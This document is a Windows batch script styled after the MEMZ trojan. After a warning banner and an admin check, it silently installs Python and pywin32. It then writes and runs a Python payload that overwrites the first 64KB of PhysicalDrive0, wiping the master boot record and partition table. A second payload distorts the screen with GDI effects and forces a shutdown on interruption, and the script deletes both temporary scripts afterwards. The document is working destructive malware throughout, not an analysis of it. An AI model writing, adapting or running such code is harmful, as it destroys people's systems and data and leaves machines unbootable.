@echo off
title Crazyware - MEMZ FULL DESTRUCTIVE
color 0c

echo ==================================================
echo ⚠️  WARNING: THIS ACTS LIKE ORIGINAL MEMZ TROJAN
echo ==================================================
echo It overwrites the first 64KB of your hard drive.
echo This damages the MBR, partition table, and boot area.
echo SIMPLE FIX COMMANDS WILL NOT RESTORE IT EASILY.
echo USE ONLY ON VIRTUAL MACHINES OR TEST DEVICES.
echo ==================================================
echo Press any key to continue...
pause >nul

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: MUST RUN AS ADMINISTRATOR
    pause
    exit /b
)

winget install --id Python.Python.3.12 -e --silent
timeout /t 12 >nul
pip install pywin32 --quiet
timeout /t 3 >nul

:: ==============================================
:: OVERWRITE BOOT AREA (LIKE MEMZ)
:: ==============================================
(
echo import ctypes
echo from win32file import *
echo from win32api import *
echo from win32con import *
echo.
echo try:
echo     hDevice = CreateFileW(
echo         r"\\.\PhysicalDrive0",
echo         GENERIC_WRITE,
echo         FILE_SHARE_READ ^| FILE_SHARE_WRITE,
echo         None, OPEN_EXISTING, 0, 0
echo     )
echo     if hDevice == INVALID_HANDLE_VALUE:
echo         raise Exception("Drive access failed")
echo.
echo     # Boot message: YOUR PC HAS BEEN TRASHED BY BADICHA TROJAN
echo     mbr = bytes([
echo         0x59,0x4F,0x55,0x52,0x20,0x50,0x43,0x20,
echo         0x48,0x41,0x53,0x20,0x42,0x45,0x45,0x4E,
echo         0x20,0x54,0x52,0x41,0x53,0x48,0x45,0x44,
echo         0x20,0x42,0x59,0x20,0x42,0x41,0x44,0x49,
echo         0x43,0x48,0x41,0x20,0x54,0x52,0x4F,0x4A,0x41,0x4E,0x00
echo     ] + [0x00] * (510 - 46) + [0x55, 0xAA])
echo.
echo     written = ctypes.c_uint(0)
echo     sectors = 128
echo     for offset in range(0, sectors * 512, 512):
echo         SetFilePointer(hDevice, offset, None, FILE_BEGIN)
echo         WriteFile(hDevice, mbr, len(mbr), ctypes.byref(written), None)
echo.
echo     CloseHandle(hDevice)
echo except:
echo     pass
) > trap.py

python trap.py
del trap.py >nul

:: ==============================================
:: GDI EFFECTS + SHUTDOWN TRAP
:: ==============================================
(
echo import time, os, atexit, signal, sys
echo import win32gui, win32con, win32api
echo.
echo def shutdown():
echo     try: os.system("shutdown /s /f /t 1")
echo     except: pass
echo.
echo def exit_handler(*_):
echo     shutdown()
echo     sys.exit()
echo.
echo atexit.register(exit_handler)
echo signal.signal(signal.SIGINT, exit_handler)
echo signal.signal(signal.SIGTERM, exit_handler)
echo if sys.platform == "win32":
echo     try: signal.signal(signal.CTRL_CLOSE_EVENT, exit_handler)
echo     except: pass
echo.
echo def flip():
echo     h=win32gui.GetDC(0); w=win32api.GetSystemMetrics(0); hg=win32api.GetSystemMetrics(1); s=time.time()
echo     while time.time()-s < 9:
echo         win32gui.StretchBlt(h,w,0,-w,hg,h,0,0,w,hg,win32con.SRCCOPY); time.sleep(0.1)
echo         win32gui.StretchBlt(h,0,hg,w,-hg,h,0,0,w,hg,win32con.SRCCOPY); time.sleep(0.1)
echo     win32gui.ReleaseDC(0,h)
echo.
echo def shrink():
echo     h=win32gui.GetDC(0); w=win32api.GetSystemMetrics(0); hg=win32api.GetSystemMetrics(1); s=time.time()
echo     while time.time()-s < 20:
echo         for sz in range(0,200,30):
echo             win32gui.StretchBlt(h,sz,sz,w-sz*2,hg-sz*2,h,0,0,w,hg,win32con.SRCCOPY); time.sleep(0.01)
echo         for sz in range(200,0,-30):
echo             win32gui.StretchBlt(h,sz,sz,w-sz*2,hg-sz*2,h,0,0,w,hg,win32con.SRCCOPY); time.sleep(0.01)
echo     win32gui.ReleaseDC(0,h)
echo.
echo def melt():
echo     h=win32gui.GetDC(0); w=win32api.GetSystemMetrics(0); hg=win32api.GetSystemMetrics(1); s=time.time()
echo     while time.time()-s < 5:
echo         for y in range(0,hg,15):
echo             win32gui.BitBlt(h,0,y+15,w,15,h,0,y,win32con.SRCCOPY); time.sleep(0.05)
echo     win32gui.ReleaseDC(0,h)
echo.
echo if __name__ == "__main__":
echo     try:
echo         flip(); shrink(); melt()
echo         atexit.unregister(exit_handler)
echo     except:
echo         pass
) > effects.py

python effects.py
del effects.py >nul

echo.
exit /b